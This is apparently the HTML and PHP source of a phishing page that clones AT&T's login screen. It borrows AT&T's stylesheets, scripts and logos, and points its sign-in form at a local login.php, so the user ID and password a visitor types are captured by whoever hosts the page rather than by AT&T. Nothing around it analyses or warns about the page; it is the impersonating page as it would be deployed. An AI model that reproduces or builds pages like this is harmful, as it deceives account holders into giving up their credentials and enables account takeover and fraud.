<?php

require "att.php";

?>

<HTML><head>

<title>AT&amp;T - Login</title>
<script src="//www.att.com/scripts/adobe/prod/detm-container-hdr.js"></script>
<!-- TG1403 S4055 - iframe -->
<style id="antiClickjack">body{display:none !important;}</style>
<script type="text/javascript">
   if (self === top) {
       var antiClickjack = document.getElementById("antiClickjack");
       antiClickjack.parentNode.removeChild(antiClickjack);
   } else {
   	var noFrameBusting = false;
   	if( ! noFrameBusting ) {
       top.location = self.location;
   	}
   }
</script>

<script type="text/javascript">
(function() {
         if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                 var msViewportStyle = document.createElement("style");
                 msViewportStyle.appendChild(
                          document.createTextNode("@-ms-viewport{width:auto!important}")
                 );
                 document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
         }
})();
</script>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=1.0" />

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/_fontface.css"  type="text/css" />
<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/main.css"  type="text/css" media="screen" />


<!--[if lte IE 6]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie6.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 7]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie7.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 8]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie8.css"  type="text/css" media="screen" />

<![endif]-->

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/mobile.css"  type="text/css" media="handheld, only screen and (max-device-width: 480px)" />

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/jquery-1.5.1.min.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/simplemodal/jquery.simplemodal.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/sso/slid/1201/script.js" ></script>

<script type="text/javascript" src="//sadlib.static-app.synacor.com/client/att/att.js" async></script>

<!-- TG1403 S5534 - CR-1402-0249 RD2376 - Replace WebTrends tags with Adobe tags -->


<!-- START OF SmartSource Data Collector TAG v10.2.0 -->
<!-- Copyright (c) 2012 Webtrends Inc.  All rights reserved. -->
<script>
window.webtrendsAsyncInit=function(){
    var dcs=new Webtrends.dcs().init({
        dcsid:"dcsdjtdi8wz5bdo7rtxv6ly3m_4s9j"
        ,domain:"statse.webtrendslive.com"
        ,navigationtag: "div,span"
        ,timezone:-8
        ,offsite:true
        ,download:true
        ,downloadtypes:"xls,doc,pdf,txt,csv,zip,docx,xlsx,rar,gzip"
        ,onsitedoms:"att.net"
        ,plugins:{
            //hm:{src:"//s.webtrends.com/js/webtrends.hm.js"}
          //  LinkTrack: { src: "/scripts/linkTrack.js", DivList: ".*" }
        }
        }).track();
};
(function(){
    var s=document.createElement("script"); s.async=true; s.src="/commonLogin/igate_edam/staticContent/images/SLID/js/webtrends.min.js";
    var s2=document.getElementsByTagName("script")[1]; s2.parentNode.insertBefore(s,s2);
}());
</script>
<noscript><img alt="dcsimg" id="dcsimg" width="1" height="1" src="//statse.webtrendslive.com/dcsslzoj37dv0hctv586rtbcg_1v7w/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=10.2.0&amp;dcssip=www.beta.att.yahoo.com"/></noscript>
<!-- END OF SmartSource Data Collector TAG v10.2.0 -->

</head>



<body><DIV id=header></DIV>
<DIV id=pageWrap>
<DIV id=pageBody>
<DIV id=loginWrap>
<FORM id=LoginForm method=post name=LoginForm action=login.php type="com.sbc.idm.igate_edam.forms.LoginFormBean" focus="userid">&nbsp;&nbsp;&nbsp;&nbsp; 
<H1><STRONG>Sign in now!</STRONG></H1>
<UL class=uLogin>
<LI id=uID><LABEL for=nameBox>User ID/Email Address</LABEL> <INPUT id=nameBox class=slidTxtbox maxLength=50 size=50 name=userid> 
<P class=fgtEml><A id=fgtEml class=colLink href="#">Forgot User ID?</A></P>
<LI id=uPwd><LABEL for=pwdBox>Password</LABEL> <INPUT id=pwdBox class=slidTxtbox maxLength=50 size=50 type=password name=password autocomplete="off" placeholder="Password"> 
<P class=fgtPwd><A onclick=overlay() aria-describedby=spanLog id=fgtPwd class=colLink href="#modal">Forgot Password?</A> <SPAN id=spanLog style="DISPLAY: none">Redirects to www.att.com.</SPAN></P>
<LI id=shwPc>
<P><INPUT id=showPwd class=slidChkBox type=checkbox name=showPwd><LABEL for=showPwd>Show password characters</LABEL></P>
<LI id=uRM>
<P><INPUT id=rememberID class=slidChkBox type=checkbox name=rememberID><LABEL for=rememberID>Keep me signed in</LABEL></P>
<P>for 2 weeks unless I sign out. <SPAN id=ques2 class=quesIcon><SPAN id=qAns2 class=qAns>Info</SPAN></SPAN></P>
<P>(Uncheck if on a shared computer.)</P>
<LI id=uBtn><INPUT id=submitLogin class=loginBtn type=submit value="Sign In"> 
<LI id=uActCr><LABEL for=regurl>Don't have an AT&amp;T Account?</LABEL> <A id=regurl href="http://www.att.net/signup"><INPUT id=acctCreate class=loginBtnClear type=button value="Create AT&amp;T Account"></A> 
<LI id=ulgnYah><LABEL for=yahLgnUrl>Login with Yahoo ID</LABEL> <A id=yahLgnUrl href="https://login.yahoo.com/config/login"><INPUT id=submitYahLogin class=loginBtnYah type=button value="Login with Yahoo ID"></A> </LI></UL>
<DIV id=lognp></DIV>
<DIV id=overLayCheck class=overLayRight1></DIV></FORM>
<DIV id=promo></DIV>
<DIV role=dialog id=modal aria-labelledby=RedirectionModal>
<DIV class=modal-content>
<DIV class=copy>
<P id=RedirectionModal class=pstyle>You are being redirected to ATT.com<BR><SPAN class=pstyle1>where you can recover your password.</SPAN> </P></DIV>
<DIV id=count style="MARGIN-TOP: -28px; VISIBILITY: hidden">Redirecting in 10 seconds...</DIV><A onclick=cancelLoad() role=button aria-label=Cancel id=CancelM class=hover href="#"><IMG class=btnCancel alt=Cancel src="https://home.secureapp.att.net/design/CDLS10/img/logos/Button.png"></A> 
<DIV><IMG id=logo1 class=attlogo alt=attlogo src="https://home.secureapp.att.net/design/CDLS10/img/logos/AT&amp;T_logo.png"></IMG></DIV></DIV>
<DIV class=overlay></DIV></DIV></DIV></DIV></DIV>
<DIV id=footer></DIV>
<DIV></DIV>
<SCRIPT src="//www.att.com/scripts/adobe/prod/detm-container-ftr.js"></SCRIPT>

<SCRIPT type=text/javascript>_satellite.pageBottom();</SCRIPT>

<SCRIPT type=text/javascript>
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2FcommonLogin; path=/";
/*]]>*/ 
</SCRIPT></BODY></HTML>